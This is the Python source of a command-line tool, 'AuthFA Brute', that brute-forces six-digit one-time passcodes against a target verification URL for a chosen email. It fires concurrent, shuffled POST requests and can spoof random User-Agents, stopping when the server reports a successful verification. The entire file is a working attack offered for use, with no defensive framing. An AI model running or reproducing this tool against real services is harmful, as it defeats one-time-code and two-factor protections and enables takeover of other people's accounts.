import aiohttp
import asyncio
import random
import argparse
import sys
import warnings
from time import sleep
from colorama import Fore, Style, init
from fake_useragent import UserAgent

init(autoreset=True)
warnings.simplefilter("ignore")  # Suppress warnings

# ASCII Art
ASCII_ART = """
 +-++-++-++-++-++-+ +-++-++-++-++-+
 |A||u||t||h||F||A| |B||r||u||t||e|
 +-++-++-++-++-++-+ +-++-++-++-++-+
"""

def print_banner():
    print(Fore.CYAN + ASCII_ART)
    print(Fore.YELLOW + "\nUsage: python3 script.py -u <URL> --email <email> [options]\n")
    print(Fore.GREEN + "Options:")
    print(Fore.WHITE + "  -u, --url               Target URL for OTP verification (Required)")
    print(Fore.WHITE + "  --email                 Email associated with OTP verification (Required)")
    print(Fore.WHITE + "  --domain                Specify a custom domain")
    print(Fore.WHITE + "  --random-user-agent     Use a random User-Agent for requests")
    print(Fore.WHITE + "  --rate-limit            Delay in seconds between requests (Default: 0)")
    print(Fore.WHITE + "  --range                 OTP range (e.g., 000000-999999, Default: 99999-1000000)")


# Show banner only if no arguments are provided
if len(sys.argv) == 1:
    print_banner()
    sys.exit(0)  # Exit to prevent further execution
    

# Argument Parser
parser = argparse.ArgumentParser(description="Async OTP Bruteforce Tool", add_help=False)
parser.add_argument("-u", "--url", required=True, help="Target URL for OTP verification")
parser.add_argument("--domain", help="Specify a custom domain")
parser.add_argument("--random-user-agent", action="store_true", help="Use a random User-Agent for requests")
parser.add_argument("--rate-limit", type=int, default=0, help="Delay in seconds between requests")
parser.add_argument("--range", type=str, default="99999-1000000", help="OTP range (e.g., 100000-999999)")
parser.add_argument("--email", required=True, help="Email associated with OTP verification")
args = parser.parse_args()

# Handle OTP range
try:
    start, end = map(int, args.range.split("-"))
    otps = [str(i).zfill(6) for i in range(start, end)]
except ValueError:
    print(Fore.RED + "[ERROR] Invalid OTP range format. Use 'start-end', e.g., 100000-999999.")
    sys.exit(1)

random.shuffle(otps)

# Random User-Agent Handling
ua = UserAgent()
user_agent = ua.random if args.random_user_agent else "curl/8.7.1"

# Headers
headers = {
    "User-Agent": user_agent,
    "Accept": "*/*",
    "Content-Type": "application/json",
    "Host": args.domain if args.domain else args.url.split("//")[-1].split("/")[0]
}

# Concurrency Settings
initial_batch_size = 100
concurrent_limit = 50
stop_event = asyncio.Event()

async def fetch(session, url, payload, semaphore):
    async with semaphore:
        if stop_event.is_set():
            return False

        async with session.post(url, json=payload, headers=headers) as response:
            status_color = Fore.GREEN if response.status == 201 else Fore.RED
            print(f"{status_color}[{response.status}] {payload['otp']}{Style.RESET_ALL}")
            
            if response.status == 201:
                json_response = await response.json()
                if "Verification successful" in json_response.get("message", ""):
                    print(Fore.CYAN + f"[SUCCESS] Valid OTP found: {payload['otp']}")
                    print(json_response)
                    stop_event.set()
                    return True
            
            if args.rate_limit:
                sleep(args.rate_limit)
            return False

async def fetch_batch(session, url, batch, semaphore):
    tasks = [fetch(session, url, {"email": args.email, "otp": otp}, semaphore) for otp in batch]
    responses = await asyncio.gather(*tasks)
    return any(responses)

async def main():
    print(Fore.YELLOW + ASCII_ART)
    print(Fore.BLUE + f"[INFO] Target: {args.url}")
    print(Fore.BLUE + f"[INFO] Using Domain: {headers['Host']}")
    print(Fore.BLUE + f"[INFO] Rate Limit: {args.rate_limit}s" if args.rate_limit else "")
    print(Fore.BLUE + f"[INFO] Random User-Agent: {'Enabled' if args.random_user_agent else 'Disabled'}")
    print(Fore.MAGENTA + "[STARTING ATTACK]\n")
    
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit_per_host=100)) as session:
        semaphore = asyncio.Semaphore(concurrent_limit)
        batch_size = initial_batch_size
        for i in range(0, len(otps), batch_size):
            batch = otps[i:i + batch_size]
            if await fetch_batch(session, args.url, batch, semaphore):
                break
            if stop_event.is_set():
                break

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Script interrupted by user.")
        sys.exit(0)
